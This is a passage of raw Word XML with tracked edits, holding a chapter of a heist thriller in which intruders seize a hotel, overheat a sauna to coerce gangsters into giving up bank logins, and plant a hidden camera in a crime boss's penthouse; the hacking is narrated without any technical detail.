          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> she screamed. “Private security incapacitated! Attackers equipped with automatic rifles and combat armor…”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voice trailed off. She hadn’t expected to survive long enough to say more than half a dozen words. There were no blasts of gunfire, no bullets flying.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there was no 9-1-1 dispatcher answering the line, either.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three soldiers stared at her in astonishment.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goliath with the shield and the MAC-10 simply said, “Holy crap.”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with the M4 said, “That took some serious balls, lady.” To the rest of the captive security personnel, he said, “Did you guys see that?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is how you do your job!”</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Torres looked back and forth at the three invaders, confused.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who had snuck up behind her wore a light ballistic vest and a bowl-shaped open-faced helmet, and carried a silver snubnose .44 Magnum.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“We’re not here to hurt you,” he said. “We just need you out of the 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The yellow handset vibrated in her hand. “Hey. Ms., um, Torres, was it?” It was a woman’s voice — </w:t>
      </w:r>
      <w:ins w:id="2781" w:author="TextVet" w:date="2016-03-28T10:51:00Z">
        <w:r w:rsidR="004D48FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>matching</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2782" w:author="TextVet" w:date="2016-03-28T10:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004D48FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the same </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2783" w:author="TextVet" w:date="2016-03-28T10:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002D3C71">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">voice </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2784" w:author="TextVet" w:date="2016-03-28T10:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004D48FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>as</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the one on her radio. Torres looked at the handset in bewilderment. “I’m… I’m really, really sorry.”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 the hell are you people?” Torres hissed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2785" w:author="TextVet" w:date="2016-03-28T10:51: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in the light vest gestured with his revolver. “That was incredibly heroic, what you did just now,” he said. “You should be very proud of yourself.” He reached into a backpack on the floor, and pulled out a few lengths of nylon rope. “But don’t try it again.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005374FD" w:rsidRPr="000D3488" w:rsidRDefault="005374FD" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Gallante’s exercise facilities</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> comprised the entire ground floor of the hotel’s south wing. The treadmills and weight machines were populated sparsely, but the massage tables and tanning beds saw plenty of use. The Finnish saunas were always a favorite among eastern European guests. Especially Russians.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one of the small, steamy rooms, three muscular men sat naked on white towels laid across wooden benches, talking boisterously in Russian.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her husband’s still twitching on the ground, right?” one man regaled his two fellows. “And she’s, like, blank. You know how they go blank, right? And I just smile at her and go, ‘Cheer up, honey! You’re going to die tonight anyway</w:t>
      </w:r>
      <w:ins w:id="2786" w:author="TextVet" w:date="2016-03-28T10:54:00Z">
        <w:r w:rsidR="00312062">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2787" w:author="TextVet" w:date="2016-03-28T10:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00312062">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you might as well do it in a good mood!’”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two other men burst out in raucous laughter. “You’re one cold bastard,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what did she do?”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check this out,” he continued. “I had her tied up with rope, so I thought I could take my time. So</w:t>
      </w:r>
      <w:ins w:id="2788" w:author="TextVet" w:date="2016-03-28T10:55:00Z">
        <w:r w:rsidR="00C2085C">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I’m going through the apartment, looking for the merchandise, when I hear this, ‘Click! Click-click…!’ So I come back and take a peek…”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“Was it a gun?” one man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storyteller shook his head.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telephone!” the other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“Nope.”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what was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storyteller pantomimed putting a cigarette in his mouth and cupping his hands to light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lighter!”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She managed to dig it out of her pocket, and she sort of, like, twisted her hands around…”</w:t>
      </w:r>
      <w:ins w:id="2789" w:author="TextVet" w:date="2016-03-28T10:56:00Z">
        <w:r w:rsidR="0005675F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2790" w:author="TextVet" w:date="2016-03-28T10:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0005675F">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He mimicked.</w:t>
      </w:r>
      <w:ins w:id="2791" w:author="TextVet" w:date="2016-03-28T10:56:00Z">
        <w:r w:rsidR="0005675F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2792" w:author="TextVet" w:date="2016-03-28T10:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0005675F">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“…to get the flame onto the rope.”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“Daaaaamn!” said one of the listeners. “Clever girl!”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know, right? Must’ve hurt like the Devil, with the fire on her wrists, but it worked. By the time I noticed, she’d already got her hands free, and she made a run for it before I could stop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reached toward a control board mounted near the frosted glass door of the tiny room. With the press of a button, nozzles recessed in the wood-paneled walls emitted a quick hiss of steam.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“Moral of the story? When you’re tying someone up with ropes… Make sure they’re not a smoker.”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men laughed. Moisture condensed on their bodies and beaded with their sweat. Wet droplets ran down their faces and chests.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One of them asked tentatively, “Hey, do you guys like it turned up this high?”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looked at the control board. A small black screen reported:</w:t>
      </w:r>
      <w:commentRangeStart w:id="2793"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2793"/>
      <w:r w:rsidR="00B22E4F">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2793"/>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that’s a little too high,” one conceded, and pressed a down-arrow button repeatedly until the screen displayed </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>120°F (49°C)</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They let a minute go by, but felt no improvement. All three began breathing a little </w:t>
      </w:r>
      <w:del w:id="2794" w:author="TextVet" w:date="2016-03-28T10:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007546C8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">bit </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>more heavily.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thought you turned it down.”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did! Look!”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screen again showed </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>180°F (82°C)</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“Idiot doesn’t know how to work the sauna.”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“Shut up, asshole.” He punched it back down, watching the numbers descend until they again hit </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>120°F (49°C)</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moment he took his finger away, the numbers immediately jumped back up to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>180°F (82°C)</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“What the </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2795" w:author="TextVet" w:date="2016-03-28T11:00:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>hell</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? Stupid piece of crap. I’ll go yell at someone about it.” He rose, wrapped his towel around his waist, and pushed on the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moved about an inch, and then hit some kind of restraint. He pushed against it harder. It wouldn’t budge.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Outside, through the frosted glass, a silhouette of an athletic man appeared just beyond the door. He seemed to be wearing a small helmet and a bulky suit.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“Brothers!” said the man, in Russian. “How are you doing in there? Nice and warm?”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men sat up shocked. One pounded on the glass. “What the hell is this? Who are you?” one yelled.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I’m nobody! Nobody at all! But I do have a matter of pressing business with someone named Ivan Zheleznov. Perhaps you fellows have heard of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One stood and body-checked the door. It proved fruitless.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really wouldn’t do that if I were you,” the man said mischievously. “All that physical exertion. You might work up a sweat.”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“Let us out, you vermin!” one screamed, and had to sit down to gasp for air. Each breath singed his lungs.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 until we chat!” the man said. “You see, brothers, it’s not really </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>my</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> interest per se, but I have some colleagues here who would like to know one slight, insignificant little piece of information. When Ivan pays you, what’s the routing number of the bank that the payments come from?”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“Are you fucking joking?” one said, fighting rage as the room boiled around him. “Who the hell memorizes bank routing numbers?”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“Then here’s what’s going to happen, buddies!” said the man. “My colleagues are going to do some exploration of Ivan’s financials, and they’re going to use </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>your</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> bank records to do it. Now, you’re each going to give me your logins and passwords to your bank accounts. And my colleagues — they’re in control of your temperature, by the way — they’re going to sift through your transaction histories until they find checks or transfers connected to Ivan. Any additional info you guys can provide to expedite that search will make the whole thing go much more quickly.”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“Go choke on a dick, asshole! We’re not going to hand our bank accounts to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think you will,” said the man. “And I’d like to remind you that my colleagues are listening to me right now and are ready to use your login information immediately, so it’ll do you absolutely no good to lie. All it’ll do is waste your breath.”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“Rot in hell!” one screamed as he struggled, weakening, against the door.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2796" w:author="TextVet" w:date="2016-03-28T11:02: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chuckled. “Let me know when you guys are ready,” he said, and began whistling a cheerful tune.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002E428A" w:rsidRPr="000D3488" w:rsidRDefault="002E428A" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Ivan Zheleznov was freezing.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> His hoarse voice rattled into his room’s desk phone. “You fixing right now! Understand?”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Tina’s voice politely responded, “We’re terribly sorry for the malfunction of your air conditioning, sir. We’re sending a repairman right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was Danny’s cue.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stood in an undecorated emergency stairwell that ran down the full height of the building. His HERF gun was far away, stored safely in the security office where Sergey’s crew sat monitoring the captives. He picked up his toolbox, and with a deep breath that echoed off </w:t>
      </w:r>
      <w:del w:id="2797" w:author="TextVet" w:date="2016-03-28T11:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000857CE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the cinderblock walls, he opened an emergency exit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stepped out to a wide antechamber. One side of the room was a full plate window </w:t>
      </w:r>
      <w:ins w:id="2798" w:author="TextVet" w:date="2016-03-28T11:04:00Z">
        <w:r w:rsidR="00CA1257">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>over</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">looking </w:t>
      </w:r>
      <w:del w:id="2799" w:author="TextVet" w:date="2016-03-28T11:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CA1257">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">out at </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the nighttime skyline. The door to the penthouse elevator sat closed next to the emergency exit on one end of the passageway. On the other, a large cedarwood double door stood ominously before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shook his head and arms limply to force himself to relax, and tapped his knuckles on the door. He stood patiently, toolbox in hand, waiting for a response.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shouting in Russian. After a few long moments, a lithe, aggressive man opened the door. He wordlessly bobbed his head to the side, motioning for Danny to come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air in the suite was irritatingly cold. A fierce draft blew strongly enough to make hair wave and clothes billow. The balcony’s French doors had been opened in an attempt to let out the cold. On the balcony, a few leather-jacketed men and barely</w:t>
      </w:r>
      <w:ins w:id="2800" w:author="TextVet" w:date="2016-03-28T11:06:00Z">
        <w:r w:rsidR="000F7D68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2801" w:author="TextVet" w:date="2016-03-28T11:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F7D68">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dressed women smoked and chatted</w:t>
      </w:r>
      <w:del w:id="2802" w:author="TextVet" w:date="2016-03-28T11:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F7D68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in the outdoor air</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Inside, a small group played </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Call </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>of Duty</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> on an enormous wall-mounted TV in a sunken living room. On the glass coffee table, somebody had thrown a hotel towel over a large crystalline bowl. He saw no weapons out in the open, but he had no doubt they were close at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twelve-year-old girl was anywhere to be seen. He did, however, see Ivan Zheleznov.</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man descended the spiral staircase like a hawk swooping down on a field mouse. He </w:t>
      </w:r>
      <w:ins w:id="2803" w:author="TextVet" w:date="2016-03-28T11:08:00Z">
        <w:r w:rsidR="00145B8E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sported</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2804" w:author="TextVet" w:date="2016-03-28T11:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00145B8E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>wore</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a fine three-piece suit and slicked-back silver hair. Despite being the oldest and physically weakest man in the room, his presence imposed a greater sense of immediate peril than any of his bodyguards.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“You come to fixing the air, yes?” he </w:t>
      </w:r>
      <w:ins w:id="2805" w:author="TextVet" w:date="2016-03-28T11:08:00Z">
        <w:r w:rsidR="007618DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>verifie</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2806" w:author="TextVet" w:date="2016-03-28T11:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007618DA">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 in a gravelly, impatient voice.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found the thermostat on the wall, walked up to it, and pretended to fiddle for a few seconds. “The thermostat looks fine. I think there’s a loose heating element somewhere near the sensor,” Danny bluffed. “I’ll need to check your ducts.”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scanned the walls, and found an air vent near the ceiling. He marched toward it with as much bravado as he could muster, and pulled a chair over so he could stand on it for a closer look. The vent was about two feet wide and a foot tall. The frosty air blasted him in the face as he looked inside the faceplate, blowing around his helmet and across his ears. Holding his head level with the opening, he turned to check the view of the room. He could see most of the open downstairs area of the penthouse. This vent would serve him well.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the help of a screwdriver from his toolbelt, he removed the grating. He spent several moments pretending to examine the dark interior of the air shaft.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uh, looks like the ventorical airfoil router is jammed,” he said. He turned to study the expressions of the Russians. They remained emotionless.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rest of his work would </w:t>
      </w:r>
      <w:ins w:id="2807" w:author="TextVet" w:date="2016-03-28T11:12:00Z">
        <w:r w:rsidR="00152B87">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>require</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2808" w:author="TextVet" w:date="2016-03-28T11:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00152B87">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>have to be done</w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E168FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> by</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sleight</w:t>
      </w:r>
      <w:ins w:id="2809" w:author="TextVet" w:date="2016-03-28T11:11:00Z">
        <w:r w:rsidR="00152B87">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2810" w:author="TextVet" w:date="2016-03-28T11:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00152B87">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of</w:t>
      </w:r>
      <w:ins w:id="2811" w:author="TextVet" w:date="2016-03-28T11:11:00Z">
        <w:r w:rsidR="00152B87">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2812" w:author="TextVet" w:date="2016-03-28T11:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00152B87">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picked up his toolbox and brought it up to the vent. The opening was big enough for him to rest the toolbox partway in the air duct, obscuring his hands from the watchful eyes of Ivan and his men. Danny cracked the lid open and rummaged noisily through the box’s contents. Metallic echoes reflected back at him in the flowing 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From inside the toolbox, he inconspicuously fished out a small black device, roughly the size and shape of a pack of cigarettes. On one edge of the object, behind a lens the size of a dime, a camera iris expanded and contracted with a soft whir as it tried to accommodate the light levels of the room. Using his body to hide his actions, Danny wadded up a ball of Sticky Tack putty and used it to affix the wireless camera inside the air vent.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Trusting the rattle of the cold, windy air to obscure his voice from the Russians, Danny murmured, “Mike, how’s the angle?”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his Bluetooth earpiece, Mike’s voice replied in tinny tones. “Right now all we can see is you, but it should be good enough for situational awareness once you’re out of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said under his breath, “Every second I’m here is a second too long. Mike, prepare to cut the air in five.” He gave the Sticky Tack one last gentle tug to make sure the camera was affixed securely, and took a deep breath. In one quick motion, he pulled his toolbox out of the vent and put the faceplate back over the opening, praying that he was fast enough to keep the Russians from seeing what he had installed behind it. He screwed the grate into place. His fingers shivered as he worked, but not from the cold. He couldn’t quite get the threads on the screws to align.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he fiddled with the cover, the air vent</w:t>
      </w:r>
      <w:r w:rsidR="003C5048">
        <w:rPr>
